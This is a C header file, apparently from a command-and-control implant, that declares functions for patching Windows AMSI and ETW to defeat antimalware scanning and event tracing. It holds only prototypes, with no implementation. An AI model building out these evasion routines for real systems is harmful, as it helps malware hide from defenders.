/**
 * @file amsi.h
 * @brief AMSI and ETW bypass for Windows
 * 
 * Bypasses:
 * - AMSI (Antimalware Scan Interface)
 * - ETW (Event Tracing for Windows)
 */

#ifndef C2_AMSI_H
#define C2_AMSI_H

#include <stdbool.h>

#ifdef __cplusplus
extern "C" {
#endif

/**
 * @brief Patch AMSI to bypass scanning
 * 
 * @return int 0 on success, -1 on failure
 */
int amsi_bypass(void);

/**
 * @brief Patch ETW to disable tracing
 * 
 * @return int 0 on success, -1 on failure
 */
int etw_bypass(void);

/**
 * @brief Check if AMSI is active
 * 
 * @return true if AMSI is active
 */
bool amsi_is_active(void);

/**
 * @brief Check if ETW is active
 * 
 * @return true if ETW is active
 */
bool etw_is_active(void);

#ifdef __cplusplus
}
#endif

#endif /* C2_AMSI_H */
